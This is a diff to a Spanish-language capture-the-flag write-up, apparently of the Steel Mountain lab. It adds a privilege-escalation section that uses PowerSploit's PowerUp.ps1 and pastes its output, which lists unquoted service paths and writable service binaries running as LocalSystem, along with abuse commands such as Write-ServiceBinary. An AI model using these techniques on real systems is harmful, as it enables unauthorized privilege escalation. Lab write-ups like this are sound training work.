@@ -60,6 +60,8 @@ Vemos que la flag está presente
 - cat user.txt
 ![image](https://user-images.githubusercontent.com/44788583/149699085-08ee3dac-49ea-4bec-8676-84ee16f721b5.png)
 
+------
+
 ### Escalando privilegios
 
 Se usa el powershell del recurso: https://github.com/PowerShellMafia/PowerSploit en específico el archivo powershell de PowerUp.ps1
@@ -77,6 +79,163 @@ y luego se ejecuta:
 - Invoke-AllChecks
 
 ![image](https://user-images.githubusercontent.com/44788583/149706408-6bf048cf-6698-44b4-b0b3-13e00b22501a.png)
+
+---------
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+Name           : AWSLiteAgent
+Check          : Unquoted Service Paths
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+Name           : AWSLiteAgent
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName                     : AdvancedSystemCareService9
+Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+CanRestart                      : True
+Name                            : AdvancedSystemCareService9
+Check                           : Modifiable Service Files
+
+ServiceName                     : IObitUnSvr
+Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
+CanRestart                      : False
+Name                            : IObitUnSvr
+Check                           : Modifiable Service Files
+
+ServiceName                     : LiveUpdateSvc
+Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
+CanRestart                      : False
+Name                            : LiveUpdateSvc
+Check                           : Modifiable Service Files
 
 
 
